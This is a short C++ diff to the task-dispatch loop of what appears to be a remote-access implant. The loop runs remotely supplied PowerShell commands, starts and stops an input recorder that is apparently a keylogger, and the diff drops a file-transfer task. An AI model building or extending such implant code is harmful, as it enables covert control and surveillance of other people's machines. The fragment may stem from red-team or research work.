@@ -168,22 +168,18 @@ int main(int argc, char *argv[])
         if (taskManager.HasPendingTask())
         {
             CheckinResponse task = taskManager.GetNextTask();
+            std::string result;
             switch (task.type)
             {
             case 1:
-                std::string result = agent.ExecutePowerShell(task.powerShellCommand.commandlet);
+                result = agent.ExecutePowerShell(task.powerShellCommand.commandlet);
                 taskManager.StoreTaskResult(task.id, true, result);
                 break;
             case 18:
                 agent.StartInputIntentRecorder();
                 break;
             case 19:
-                std::string result = agent.StopInputIntentRecorder();
-                taskManager.StoreTaskResult(task.id, true, result);
-                break;
-
-            case 20:
-                std::string result = agent.FileTransfer();
+                result = agent.StopInputIntentRecorder();
                 taskManager.StoreTaskResult(task.id, true, result);
                 break;
             }
